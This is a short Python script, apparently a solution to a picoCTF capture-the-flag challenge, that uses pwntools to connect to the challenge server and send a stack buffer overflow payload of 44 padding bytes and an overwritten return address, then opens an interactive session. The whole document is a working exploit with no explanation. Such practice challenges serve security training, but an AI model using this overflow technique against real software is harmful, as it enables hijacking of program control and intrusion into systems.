from pwn import *

target = remote("saturn.picoctf.net", 57280)

target.recvuntil(b"string: \n")
payload = b"a"*44 + p32(0x080491f6)

target.sendline(payload)
target.interactive()